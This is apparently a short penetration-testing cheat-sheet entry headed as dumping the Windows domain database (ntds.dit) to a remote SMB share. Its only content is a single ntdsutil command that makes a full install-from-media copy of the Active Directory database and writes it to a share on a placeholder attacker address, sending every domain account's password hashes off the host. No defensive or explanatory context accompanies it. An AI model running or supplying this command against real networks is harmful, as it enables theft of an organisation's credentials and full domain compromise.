# Dumping ntdsdit locally to a remote smb share
```shell
ntdsutil "ac i ntds" "ifm" "create full \\<ATTACKER_IP>\pwd" q q
```